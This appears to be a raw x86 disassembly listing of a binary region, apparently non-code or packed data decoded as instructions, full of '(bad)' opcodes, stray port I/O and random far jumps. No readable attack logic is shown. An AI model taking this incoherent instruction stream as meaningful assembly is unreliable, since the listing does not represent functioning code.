  41bb1d:	add    dh,BYTE PTR [ebx-0x6]
  41bb20:	fisttp DWORD PTR [esi-0x6c]
  41bb23:	mov    al,0x68
  41bb25:	aad    0x98
  41bb27:	out    0xb6,eax
  41bb29:	adc    DWORD PTR [edx+0x48],ecx
  41bb2c:	add    BYTE PTR [esi-0x31],al
  41bb2f:	icebp  
  41bb30:	xor    DWORD PTR [edi],esp
  41bb32:	and    BYTE PTR [ebx-0x2ff2a634],0x7b
  41bb39:	push   ebp
  41bb3a:	je     0x41bb91
  41bb3c:	xor    eax,0x69e050f0
	...
  41bbb1:	add    BYTE PTR [eax],al
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	out    0x3e,eax
  41bbc2:	ror    BYTE PTR [edi+0x69],cl
  41bbc5:	sub    eax,DWORD PTR [ecx]
  41bbc7:	add    ch,dh
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    BYTE PTR [ebx],dh
  41bbcd:	fadd   QWORD PTR [ecx]
  41bbcf:	inc    edx
  41bbd0:	mov    edi,edi
  41bbd2:	push   cs
  41bbd3:	cdq    
  41bbd4:	xchg   edx,eax
  41bbd5:	cdq    
  41bbd6:	retf   
  41bbd7:	bound  esp,QWORD PTR [edi+0x6c]
  41bbda:	pop    ebp
  41bbdb:	sub    DWORD PTR [eax-0x2666539c],edx
  41bbe1:	xor    BYTE PTR [edi],cl
  41bbe3:	push   edi
  41bbe4:	les    ebp,FWORD PTR [ebx-0x7cfe1671]
  41bbea:	and    eax,0x3f27746f
  41bbef:	push   edx
  41bbf0:	mov    ch,0x5c
  41bbf2:	cmp    al,0xe3
  41bbf4:	and    al,0xd9
  41bbf6:	gs mov al,0x89
  41bbf9:	adc    BYTE PTR [esi],bh
  41bbfb:	or     edi,eax
  41bbfd:	cmp    DWORD PTR ds:0xbaf002d6,ebx
  41bc03:	dec    ebx
  41bc04:	fadd   DWORD PTR [edx-0x79f37a0f]
  41bc0a:	mov    bh,0xde
  41bc0c:	aam    0xbd
  41bc0e:	cli    
  41bc0f:	jno    0x41bc3e
  41bc11:	mov    dh,0xb0
  41bc13:	sti    
  41bc14:	jge    0x41bbdf
  41bc16:	and    ecx,ecx
  41bc18:	and    ebx,DWORD PTR [edi-0x585e5f4e]
  41bc1e:	pop    edi
  41bc1f:	jmp    0xb67f:0x35a5c746
  41bc26:	test   eax,0x18f29818
  41bc2b:	js     0x41bc97
  41bc2d:	stc    
  41bc2e:	pop    edi
  41bc2f:	mov    al,ds:0x83b358d2
  41bc34:	dec    esp
  41bc35:	add    esp,edx
  41bc37:	test   al,0x65
  41bc39:	pop    esp
  41bc3a:	mov    edx,0xde9779d1
  41bc3f:	cli    
  41bc40:	stc    
  41bc41:	inc    edi
  41bc42:	js     0x41bc19
  41bc44:	adc    bh,bh
  41bc46:	inc    ebx
  41bc47:	mov    eax,0x785c2bf1
  41bc4c:	fs int3 
  41bc4e:	int    0x80
  41bc50:	imul   BYTE PTR [edi]
  41bc52:	push   ebx
  41bc53:	add    eax,0xc3e46d93
  41bc58:	xchg   esp,eax
  41bc59:	pop    ebp
  41bc5a:	mov    esp,0x8302a6fd
  41bc5f:	cmp    al,0xb8
  41bc61:	or     ah,BYTE PTR [eax+0x27d1b5b7]
  41bc67:	cmp    BYTE PTR [ecx-0x36],bh
  41bc6a:	std    
  41bc6b:	mov    eax,0x7783fa58
  41bc70:	fmul   QWORD PTR [ebx+eax*2-0x4fe37b8b]
  41bc77:	inc    edi
  41bc78:	inc    esi
  41bc79:	sub    esp,ebx
  41bc7b:	xor    al,0x51
  41bc7d:	lods   al,BYTE PTR ds:[esi]
  41bc7e:	adc    ch,0x5
  41bc81:	lock xor DWORD PTR [ecx-0x38deeae],0xffffffef
  41bc89:	out    0x2a,eax
  41bc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc8c:	scas   al,BYTE PTR es:[edi]
  41bc8d:	xchg   esi,eax
  41bc8e:	inc    eax
  41bc8f:	data16 fdivr st(2),st
  41bc92:	mov    ch,BYTE PTR [ebx]
  41bc94:	mov    WORD PTR [ebp+0x7e],fs
  41bc97:	gs fs stos DWORD PTR es:[edi],eax
  41bc9a:	stos   BYTE PTR es:[edi],al
  41bc9b:	push   es
  41bc9c:	clc    
  41bc9d:	adc    WORD PTR [ebx+0x523714a0],si
  41bca4:	fild   WORD PTR [esi]
  41bca6:	or     ch,ch
  41bca8:	stos   BYTE PTR es:[edi],al
  41bca9:	jmp    0xee8dd607
  41bcae:	push   0x81274636
  41bcb3:	add    BYTE PTR [eax-0x65cbdb43],al
  41bcb9:	sar    DWORD PTR [esi-0x4b],1
  41bcbc:	fadd   st,st(2)
  41bcbe:	cdq    
  41bcbf:	jb     0x41bc87
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0xbdbf1c9a
  41bd41:	and    BYTE PTR [ebp-0x3e],dl
  41bd44:	pop    esi
  41bd45:	sub    al,0x1
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    dh,dl
  41bd4d:	cmc    
  41bd4e:	adc    edx,ecx
  41bd50:	fsubr  QWORD PTR [esi-0x7c5484b8]
  41bd56:	adc    cl,BYTE PTR [eax+0x63]
  41bd59:	add    eax,0x1cfed572
  41bd5e:	cmp    al,0xf4
  41bd60:	adc    ebx,esp
  41bd62:	mov    ds:0x46ac5bf6,al
  41bd67:	rcr    BYTE PTR [eax-0x61871559],1
  41bd6d:	add    eax,0x60f06698
  41bd72:	sub    dl,BYTE PTR [eax*8-0x2219dc8d]
  41bd79:	loop   0x41bdec
  41bd7b:	test   DWORD PTR [esi+eiz*2-0x2ea4d8c1],edi
  41bd82:	div    cl
  41bd84:	sub    DWORD PTR [esi],eax
  41bd86:	and    DWORD PTR [edx],ecx
  41bd88:	(bad)
  41bd8b:	push   0x969448f7
  41bd90:	sub    ebx,DWORD PTR [ecx-0x6]
  41bd93:	sub    BYTE PTR [ecx-0x4db513cd],dl
  41bd99:	pop    es
  41bd9a:	xlat   BYTE PTR ds:[ebx]
  41bd9b:	mov    dh,0x60
  41bd9d:	pop    ecx
  41bd9e:	test   DWORD PTR [edi-0x502754d8],eax
  41bda4:	xor    eax,DWORD PTR [ebx-0xda697fa]
  41bdaa:	lock sub BYTE PTR [ebp-0x2b],ah
  41bdae:	jmp    0x7dc5:0xeb07d9a8
  41bdb5:	xchg   ebp,eax
  41bdb6:	test   al,0x95
  41bdb8:	dec    edi
  41bdb9:	dec    edx
  41bdba:	inc    eax
  41bdbb:	inc    esp
  41bdbc:	xor    al,0x8e
  41bdbe:	mov    ds:0x8f4bb65,al
  41bdc3:	ret    0x2838
  41bdc6:	fs sub al,0x10
  41bdc9:	jae    0x41bd4b
  41bdcb:	jmp    0x41bdd7
  41bdcd:	push   edi
  41bdce:	mov    esp,0x252e46ff
  41bdd3:	pop    eax
  41bdd4:	mov    bl,0x8d
  41bdd6:	jge    0x41be51
  41bdd8:	arpl   WORD PTR [esi],ax
  41bdda:	std    
  41bddb:	xchg   esp,eax
  41bddc:	mov    edi,ds
  41bdde:	out    0x3,al
  41bde0:	add    cl,BYTE PTR [esi+eiz*8-0x2a5c2f6b]
  41bde7:	jl     0x41be49
  41bde9:	fisttp QWORD PTR ds:0xe7cc745
  41bdef:	fist   DWORD PTR [ebp+0x4a]
  41bdf2:	xor    DWORD PTR [edx+0x7589318],eax
  41bdf8:	or     ebx,DWORD PTR [bp-0x59]
  41bdfc:	sub    eax,DWORD PTR [ebx-0x55]
  41bdff:	retf   
  41be00:	sub    ch,BYTE PTR [esi]
  41be02:	pop    edx
  41be03:	shr    esp,0xa1
  41be06:	sub    ebp,DWORD PTR [edi]
  41be08:	sbb    al,0x32
  41be0a:	fbstp  TBYTE PTR [eax-0x32]
  41be0d:	aaa    
  41be0e:	test   al,0x5
  41be10:	(bad)  
  41be11:	ss jnp 0x41be51
  41be14:	add    DWORD PTR [esi],eax
  41be16:	(bad)  
  41be17:	popf   
  41be18:	mov    dh,0xcd
  41be1a:	mov    edi,0x51870baf
  41be1f:	and    al,0xf1
  41be21:	xor    al,0x4c
  41be23:	xor    al,0x45
  41be25:	fwait
  41be26:	pop    eax
  41be27:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41be29:	xchg   edx,eax
  41be2a:	addr16 retf 
  41be2c:	add    dh,BYTE PTR [ebx+ebp*2+0x119e0672]
  41be33:	push   es
  41be34:	out    0xd9,al
  41be36:	sti    
  41be37:	pop    edx
  41be38:	push   ss
  41be39:	mov    ecx,0x9a26fed2
  41be3e:	xor    BYTE PTR [esi-0x7e],0x0
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	bndldx (bad),[eax-0x1c]
  41bec3:	push   esp
  41bec4:	push   ebx
  41bec5:	sub    eax,0xf50001
  41beca:	add    BYTE PTR [eax],al
  41becc:	test   edi,0x655a5702
  41bed2:	fwait
  41bed3:	xor    eax,0x82d571e
  41bed8:	mov    ch,dl
  41beda:	mov    ebx,0xd813e6e7
  41bedf:	add    BYTE PTR [edx+0xe],bl
  41bee2:	xchg   esp,eax
  41bee3:	aaa    
  41bee4:	sbb    BYTE PTR [esp+ebp*2+0x46],ch
  41bee8:	and    dh,bh
  41beea:	out    dx,eax
  41beeb:	out    0x4a,eax
  41beed:	sbb    dl,BYTE PTR [edx+0x1c71bace]
  41bef3:	pop    edx
  41bef4:	out    0xfa,eax
  41bef6:	push   ss
  41bef7:	sahf   
  41bef8:	imul   esi,DWORD PTR [ecx],0x34c4cd7c
  41befe:	lods   eax,DWORD PTR ds:[esi]
  41beff:	pop    ebx
  41bf00:	fistp  QWORD PTR [ecx+edx*1]
  41bf03:	test   DWORD PTR [eax+ebp*1-0x29784336],esp
  41bf0a:	and    DWORD PTR [edi-0x62],esi
  41bf0d:	xchg   ecx,eax
  41bf0e:	inc    eax
  41bf0f:	fcomp  DWORD PTR [eax-0x13]
  41bf12:	std    
  41bf13:	push   0xffffffeb
  41bf15:	sbb    edx,0x58
  41bf18:	leave  
  41bf19:	adc    ah,BYTE PTR [ebx+0x674ea54f]
  41bf1f:	push   ebp
  41bf20:	shl    DWORD PTR [ecx+0x1b],cl
  41bf23:	mov    ecx,0x6cb32528
  41bf28:	addr16 mov ah,0x9d
  41bf2b:	adc    ah,BYTE PTR [esi+0x2ee78e34]
  41bf31:	lahf   
  41bf32:	mov    dh,0xf7
  41bf34:	xchg   esp,eax
  41bf35:	push   cs
  41bf36:	data16 sahf 
  41bf38:	sti    
  41bf39:	dec    ebp
  41bf3a:	inc    ax
  41bf3c:	ja     0x41bf06
  41bf3e:	and    BYTE PTR [ebx-0x6ffac698],al
  41bf44:	adc    ah,ch
  41bf46:	aam    0x7a
  41bf48:	push   ecx
  41bf49:	imul   edi,DWORD PTR [ecx-0x4f],0x3ced2589
  41bf50:	xchg   ebp,eax
  41bf51:	shl    BYTE PTR [ecx-0x13],1
  41bf54:	pop    es
  41bf55:	jns    0x41bf36
  41bf57:	sbb    ecx,esp
  41bf59:	cmp    bh,BYTE PTR [edi+0x48]
  41bf5c:	jne    0x41bf6b
  41bf5e:	scas   al,BYTE PTR es:[edi]
  41bf5f:	xchg   esp,eax
  41bf60:	les    esp,FWORD PTR [ecx]
  41bf62:	mov    al,0x7c
  41bf64:	xchg   edx,eax
  41bf65:	arpl   ax,ax
  41bf67:	fcom   QWORD PTR [edx+0x50]
  41bf6a:	mov    al,0x6b
  41bf6c:	inc    ecx
  41bf6d:	fist   DWORD PTR [edi-0x37f7192]
  41bf73:	mov    al,0x17
  41bf75:	retf   0x1f9b
  41bf78:	sub    eax,0xd7afb9b7
  41bf7d:	ins    DWORD PTR es:[edi],dx
  41bf7e:	cmp    DWORD PTR [eax],edi
  41bf80:	ss ins BYTE PTR es:[di],dx
  41bf83:	jb     0x41bf9a
  41bf85:	push   cs
  41bf86:	dec    eax
  41bf87:	add    esp,DWORD PTR [edi-0x56f23cf]
  41bf8d:	mov    ds:0x13bf744,eax
  41bf92:	fsubr  DWORD PTR [eax+0x7b]
  41bf95:	in     eax,0xff
  41bf97:	mov    ds:0xfa11ca36,eax
  41bf9c:	push   ds
  41bf9d:	sbb    BYTE PTR [ecx+ecx*8+0x21],dh
  41bfa1:	lock cmp ebp,0x28
  41bfa5:	sbb    cl,BYTE PTR [ecx+ecx*2-0x57d65bbc]
  41bfac:	sub    bh,ch
  41bfae:	adc    bl,BYTE PTR [eax]
  41bfb0:	mov    esi,0x7a62d9df
  41bfb5:	arpl   WORD PTR [ecx],bp
  41bfb7:	or     BYTE PTR [eax+0x17],ah
  41bfba:	mov    esi,0xa965e5f5
  41bfbf:	xor    al,0x91
	...
  41c031:	add    BYTE PTR [eax],al
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x2344657f]
  41c041:	rcr    DWORD PTR [esi+0x12e48ed],0x0
  41c048:	cmc    
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    al,al
  41c04d:	push   esp
  41c04e:	ret    0x2b55
  41c051:	sar    DWORD PTR [ebx+0x2f5470a8],cl
  41c057:	retf   0x38d9
  41c05a:	fcom   DWORD PTR [ecx]
  41c05c:	popf   
  41c05d:	int3   
  41c05e:	loopne 0x41c021
  41c060:	cmp    dl,al
  41c062:	in     al,dx
  41c063:	pop    ecx
  41c064:	popa   
  41c065:	xchg   ecx,eax
  41c066:	out    dx,eax
  41c067:	adc    al,0x8
  41c069:	push   ecx
  41c06a:	sbb    esp,DWORD PTR [ecx+eax*1-0xc]
  41c06e:	out    0x5d,eax
  41c070:	mov    edx,0x42c39f9e
  41c075:	xchg   esi,eax
  41c076:	jbe    0x41bff9
  41c078:	hlt    
  41c079:	dec    ecx
  41c07a:	or     edi,DWORD PTR [ecx+esi*1+0x1f]
  41c07e:	push   0x68a709dd
  41c083:	jge    0x41c073
  41c085:	arpl   WORD PTR [ecx-0x348e4916],bx
  41c08b:	(bad)  
  41c08c:	in     eax,0xc4
  41c08e:	mov    bh,0xfe
  41c090:	popf   
  41c091:	mov    dh,0xe2
  41c093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c094:	add    ebp,esi
  41c096:	aam    0x62
  41c098:	push   eax
  41c099:	test   bh,ah
  41c09b:	push   0x4e
  41c09d:	pop    ss
  41c09e:	or     DWORD PTR [ecx],esp
  41c0a0:	ja     0x41c112
  41c0a2:	and    dl,BYTE PTR [esi-0x25]
  41c0a5:	das    
  41c0a6:	and    eax,0x3117d5d0
  41c0ab:	aas    
  41c0ac:	add    eax,edx
  41c0ae:	(bad)  
  41c0af:	xlat   BYTE PTR ds:[ebx]
  41c0b0:	inc    esi
  41c0b1:	sub    eax,0xfb56c8ee
  41c0b6:	leave  
  41c0b7:	call   0x4ded:0x1498dd9c
  41c0be:	mov    al,ds:0xb727fe4a
  41c0c3:	and    al,0xf1
  41c0c5:	imul   esi,esp,0x347b54c2
  41c0cb:	fwait
  41c0cc:	(bad)  
  41c0cd:	int3   
  41c0ce:	xchg   esp,eax
  41c0cf:	xchg   esp,eax
  41c0d0:	xor    esi,edi
  41c0d2:	retf   
  41c0d3:	jns    0x41c096
  41c0d5:	dec    ebp
  41c0d6:	call   0x7780:0x74233b9a
  41c0dd:	gs (bad) 
  41c0df:	in     al,dx
  41c0e0:	inc    esp
  41c0e1:	pop    ecx
  41c0e2:	in     al,0x30
  41c0e4:	jge    0x41c09f
  41c0e6:	addr16 retf 
  41c0e8:	call   0x72b49580
  41c0ed:	test   dl,0x78
  41c0f0:	fild   QWORD PTR [ebx-0x5387df2a]
  41c0f6:	ss (bad) 
  41c0f8:	push   ecx
  41c0f9:	pop    ebp
  41c0fa:	push   esp
  41c0fb:	xchg   ebp,eax
  41c0fc:	bound  ebp,QWORD PTR [esi-0x34bb7407]
  41c102:	push   ss
  41c103:	mov    ebp,DWORD PTR [edx+esi*1+0x69f6af59]
  41c10a:	ins    BYTE PTR es:[edi],dx
  41c10b:	sbb    eax,0x4e43f494
  41c110:	leave  
  41c111:	lods   eax,DWORD PTR ds:[esi]
  41c112:	pushaw 
  41c114:	stc    
  41c115:	dec    ecx
  41c116:	mov    ah,0x96
  41c118:	in     al,0xb0
  41c11a:	jne    0x41c134
  41c11c:	mov    eax,0x2f64665e
  41c121:	lods   eax,DWORD PTR ds:[esi]
  41c122:	fstp   DWORD PTR [esi+0x62]
  41c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c126:	fnstsw WORD PTR [edx]
  41c128:	dec    ebx
  41c129:	mov    ds:0xa221ea2a,al
  41c12e:	adc    bl,dl
  41c130:	mov    esi,0xa28281df
  41c135:	das    
  41c136:	adc    DWORD PTR [edx-0x43],edi
  41c139:	mov    ebp,0xac4d72db
  41c13e:	shl    BYTE PTR [edx],1
  41c140:	in     al,dx
	...
  41c1b1:	add    BYTE PTR [eax],al
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0xd3be1bdb
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    BYTE PTR [edi],cl
  41c1cd:	sub    edi,ebx
  41c1cf:	jae    0x41c155
  41c1d1:	outs   dx,BYTE PTR ds:[esi]
  41c1d2:	add    BYTE PTR [ecx-0x1c],dh
  41c1d5:	mov    esp,0x53cdea36
  41c1da:	in     al,0xb8
  41c1dc:	pop    edx
  41c1dd:	sub    bl,BYTE PTR [ebx+0x13b5fdbc]
  41c1e3:	push   0x54365d04
  41c1e8:	(bad)  
  41c1e9:	mov    edx,0xe07e4f8e
  41c1ee:	sti    
  41c1ef:	mov    edx,0x71d209ac
  41c1f4:	data16 add BYTE PTR [eax+0x73],0x25
  41c1f9:	sbb    al,0xd3
  41c1fb:	popa   
  41c1fc:	push   0xffffffba
  41c1fe:	fbstp  TBYTE PTR [ebp-0x68593fb8]
  41c204:	xchg   DWORD PTR [edi+0x17],ebp
  41c207:	jbe    0x41c1c6
  41c209:	push   edi
  41c20a:	pop    ebx
  41c20b:	scas   al,BYTE PTR es:[edi]
  41c20c:	xor    ebp,0x29
  41c20f:	mov    cl,0x68
  41c211:	(bad)  
  41c212:	popa   
  41c213:	sub    BYTE PTR [edi],dl
  41c215:	fwait
  41c216:	mov    WORD PTR [esi-0x67],?
  41c219:	push   ecx
  41c21a:	loopne 0x41c23b
  41c21c:	mov    ds:0x406a8607,al
  41c221:	xor    al,0xb2
  41c223:	cli    
  41c224:	jno    0x41c1d3
  41c226:	and    eax,ecx
  41c228:	int3   
  41c229:	mov    edx,0x12332b28
  41c22e:	push   0x4e01ac7c
  41c233:	and    cl,bl
  41c235:	test   DWORD PTR [edi-0x3769d796],eax
  41c23b:	jle    0x41c1f7
  41c23d:	fdiv   QWORD PTR [esi-0x3e65d71b]
  41c243:	inc    ecx
  41c244:	nop
  41c245:	nop
  41c246:	sub    esp,DWORD PTR [eax-0x5ec16999]
  41c24c:	mov    WORD PTR [edi],fs
  41c24e:	mov    bh,0xca
  41c250:	fucomi st,st(5)
  41c252:	in     al,dx
  41c253:	inc    esi
  41c254:	cmp    BYTE PTR [ebp-0x48],dh
  41c257:	dec    esi
  41c258:	add    eax,DWORD PTR [esi-0x2b]
  41c25b:	pop    edx
  41c25c:	pop    ebx
  41c25d:	dec    ebp
  41c25e:	xor    BYTE PTR [ebx],ch
  41c260:	mov    ebx,0xc0057853
  41c265:	call   0x8e63e4a5
  41c26a:	mov    al,ds:0x1bf7ff6
  41c26f:	add    DWORD PTR [ecx-0x6f619701],esp
  41c275:	ficom  WORD PTR [ebx]
  41c277:	xor    al,0x55
  41c279:	mov    dh,BYTE PTR [esi+0x45]
  41c27c:	push   0xffffffcb
  41c27e:	mov    edi,0x23f76695
  41c283:	jge    0x41c2f2
  41c285:	push   edi
  41c286:	adc    al,0x8d
  41c288:	cmp    eax,0x29e2f1d1
  41c28d:	xchg   DWORD PTR ds:0x738d1944,esp
  41c293:	mov    eax,ds:0xd4342173
  41c298:	mov    bl,0x9d
  41c29a:	push   ss
  41c29b:	(bad)  
  41c29c:	xchg   edx,eax
  41c29d:	int3   
  41c29e:	sbb    ah,ah
  41c2a0:	pop    ebx
  41c2a1:	mov    eax,ds:0x60530710
  41c2a6:	inc    ecx
  41c2a7:	iret   
  41c2a8:	(bad)  
  41c2a9:	(bad)  
  41c2aa:	inc    esi
  41c2ab:	iret   
  41c2ac:	cmc    
  41c2ad:	pusha  
  41c2ae:	cmp    DWORD PTR [esi+edx*1-0x643aeee1],0x9556e577
  41c2b9:	jl     0x41c290
  41c2bb:	dec    ebp
  41c2bc:	mov    bh,0xf2
  41c2be:	mov    ecx,0x5978
	...
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	aaa    
  41c341:	inc    DWORD PTR [edx+0x13032e0]
  41c347:	add    ch,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [edx-0x27],cl
  41c34e:	rol    BYTE PTR [ebp+0x6c],1
  41c351:	cmp    ebp,DWORD PTR [ebx+ebp*8-0xc]
  41c355:	cmp    ebx,edi
  41c357:	pop    ebx
  41c358:	add    al,0x72
  41c35a:	in     al,dx
  41c35b:	cmp    al,0xb2
  41c35d:	sbb    BYTE PTR [ecx+ebx*2+0x52e330bc],0xf1
  41c365:	cdq    
  41c366:	aaa    
  41c367:	xchg   esp,eax
  41c368:	int3   
  41c369:	cmp    ah,ah
  41c36b:	cwde   
  41c36c:	fsubrp st(1),st
  41c36e:	arpl   cx,bp
  41c370:	fnstcw WORD PTR [esi]
  41c372:	add    edx,ecx
  41c374:	sbb    dh,cl
  41c376:	pop    esp
  41c377:	repz fld TBYTE PTR ds:[eax+0x73441691]
  41c37f:	pop    ss
  41c380:	push   edi
  41c381:	sub    BYTE PTR [ebx-0x4e],bh
  41c384:	cld    
  41c385:	aad    0x84
  41c387:	push   ss
  41c388:	pop    edx
  41c389:	js     0x41c404
  41c38b:	pop    eax
  41c38c:	lahf   
  41c38d:	outs   dx,BYTE PTR ds:[esi]
  41c38e:	dec    ebx
  41c38f:	je     0x41c365
  41c391:	(bad)  
  41c392:	jmp    0x41c31f
  41c394:	jmp    0x41c38a
  41c396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c397:	aad    0x9f
  41c399:	mov    al,ds:0x1e786a45
  41c39e:	mov    edx,0x183ea0e9
  41c3a3:	and    al,0xd
  41c3a5:	mov    edx,0x489f44e9
  41c3aa:	sub    al,0x78
  41c3ac:	popf   
  41c3ad:	pop    esi
  41c3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3af:	imul   eax,DWORD PTR [eax],0x7c
  41c3b2:	mov    bl,0x3b
  41c3b4:	add    DWORD PTR [ecx+0x6897b9d9],edi
  41c3ba:	repz add esp,edi
  41c3bd:	ss jnp 0x41c43d
  41c3c0:	outs   dx,BYTE PTR ds:[esi]
  41c3c1:	add    cl,BYTE PTR [ecx]
  41c3c3:	jle    0x41c391
  41c3c5:	pop    ebx
  41c3c6:	outs   dx,DWORD PTR ds:[esi]
  41c3c7:	ins    BYTE PTR es:[edi],dx
  41c3c8:	daa    
  41c3c9:	outs   dx,DWORD PTR ds:[esi]
  41c3ca:	lock xchg ebp,eax
  41c3cc:	sub    al,0xc8
  41c3ce:	xor    al,0xcc
  41c3d0:	sub    ebp,DWORD PTR [ebx]
  41c3d2:	fst    DWORD PTR [esi]
  41c3d4:	cdq    
  41c3d5:	out    0x72,al
  41c3d7:	sti    
  41c3d8:	aaa    
  41c3d9:	jp     0x41c3e1
  41c3db:	es std 
  41c3dd:	ret    0xe8b3
  41c3e0:	ja     0x41c399
  41c3e2:	js     0x41c36f
  41c3e4:	jp     0x41c381
  41c3e6:	mov    ss:0x789eea94,al
  41c3ec:	jmp    0x41c3a2
  41c3ee:	mov    cs:0xf484007b,al
  41c3f4:	cmp    DWORD PTR [ebx-0x4ef59495],esi
  41c3fa:	add    ebx,edi
  41c3fc:	jg     0x41c44e
  41c3fe:	adc    ebx,DWORD PTR [edx]
  41c400:	lds    edx,FWORD PTR [ebx]
  41c402:	mov    BYTE PTR [edi-0x3f],dl
  41c405:	and    BYTE PTR [ebx+0x5c91ec37],0x19
  41c40c:	daa    
  41c40d:	dec    esp
  41c40e:	pop    eax
  41c40f:	push   esi
  41c410:	pop    eax
  41c411:	stc    
  41c412:	aas    
  41c413:	mov    DWORD PTR [ebx+0x313570bc],esp
  41c419:	pop    ebp
  41c41a:	push   esp
  41c41b:	outs   dx,BYTE PTR ds:[esi]
  41c41c:	cli    
  41c41d:	xchg   esp,eax
  41c41e:	push   edx
  41c41f:	sub    esp,DWORD PTR [eax-0x4d]
  41c422:	std    
  41c423:	mov    dl,0x5e
  41c425:	into   
  41c426:	push   ds
  41c427:	inc    ebp
  41c428:	mov    esi,0x56bd0335
  41c42d:	jbe    0x41c3f1
  41c42f:	je     0x41c3e1
  41c431:	loop   0x41c489
  41c433:	sbb    BYTE PTR [edx+0x34d5e667],bh
  41c439:	push   ecx
  41c43a:	sbb    eax,0x1bc6fd0d
  41c43f:	and    DWORD PTR [eax],0x0
	...
  41c4b2:	add    BYTE PTR [eax],al
  41c4b4:	aam    0xec
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x5011241a]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    BYTE PTR [eax],dl
  41c4cd:	rcr    DWORD PTR [edx],1
  41c4cf:	in     al,dx
  41c4d0:	out    dx,eax
  41c4d1:	cmp    BYTE PTR [ebx-0x4c],dl
  41c4d4:	or     bh,cl
  41c4d6:	push   ss
  41c4d7:	test   BYTE PTR [ecx-0x39fa53dd],dl
  41c4dd:	aas    
  41c4de:	or     esi,DWORD PTR [edx+0x5d]
  41c4e1:	push   edx
  41c4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e3:	pop    ecx
  41c4e4:	xor    eax,0xf4304231
  41c4e9:	xchg   edx,eax
  41c4ea:	push   edx
  41c4eb:	xchg   BYTE PTR [ebx-0x519bf65e],ch
  41c4f1:	iret   
  41c4f2:	pop    ss
  41c4f3:	dec    eax
  41c4f4:	or     DWORD PTR [ebx+ebx*4+0x162111c1],eax
  41c4fb:	cld    
  41c4fc:	push   esp
  41c4fd:	pop    ebp
  41c4fe:	or     BYTE PTR [ebp+0x2d70db5],dl
  41c504:	fldcw  WORD PTR [eax-0x3156b5bc]
  41c50a:	and    eax,DWORD PTR [ecx+eax*4+0x3debc100]
  41c511:	outs   dx,DWORD PTR ds:[esi]
  41c512:	mov    WORD PTR [esi],ds
  41c514:	jo     0x41c54b
  41c516:	add    BYTE PTR [edx-0x4fd7b82e],cl
  41c51c:	jmp    0x41c4aa
  41c51e:	fstp   TBYTE PTR [edx+ebp*2]
  41c521:	lock sbb BYTE PTR [eax+0x72],dl
  41c525:	in     eax,0x55
  41c527:	hlt    
  41c528:	mov    WORD PTR [esi-0x6b],ds
  41c52b:	lock test al,0x5d
  41c52e:	or     BYTE PTR [ecx],ch
  41c530:	mov    edi,0xf5f2906b
  41c535:	pop    esp
  41c536:	dec    esi
  41c537:	imul   eax,DWORD PTR [edi-0x56],0xc5c24f7d
  41c53e:	fdivr  st(3),st
  41c540:	imul   bp,WORD PTR [esi-0x3e7d96ab],0xffb9
  41c548:	push   ecx
  41c549:	fcom   DWORD PTR [eax]
  41c54b:	stos   DWORD PTR es:[edi],eax
  41c54c:	add    al,0x44
  41c54e:	cld    
  41c54f:	xchg   DWORD PTR [esi+0x73e3a267],eax
  41c555:	pop    es
  41c556:	sbb    dl,BYTE PTR [esi]
  41c558:	add    al,0x6b
  41c55a:	xor    DWORD PTR [ecx+0x3e],0x90cdbbb0
  41c561:	ins    BYTE PTR es:[edi],dx
  41c562:	fwait
  41c563:	mov    edi,0xc58b8717
  41c568:	outs   dx,BYTE PTR ds:[esi]
  41c569:	inc    ebp
  41c56a:	sahf   
  41c56b:	inc    eax
  41c56c:	xchg   ecx,eax
  41c56d:	scas   eax,DWORD PTR es:[edi]
  41c56e:	add    al,0x35
  41c570:	repnz adc edi,DWORD PTR [edi]
  41c573:	shl    ecx,cl
  41c575:	mov    dh,0x92
  41c577:	pop    ss
  41c578:	mov    bh,0xe7
  41c57a:	inc    esp
  41c57b:	sbb    dh,BYTE PTR [edi]
  41c57d:	inc    ebp
  41c57e:	xor    BYTE PTR [esi-0x1fc38543],al
  41c584:	push   ebx
  41c585:	rol    DWORD PTR [edx-0x261c90a9],0x19
  41c58c:	cmp    eax,0x3194beeb
  41c591:	lahf   
  41c592:	loopne 0x41c525
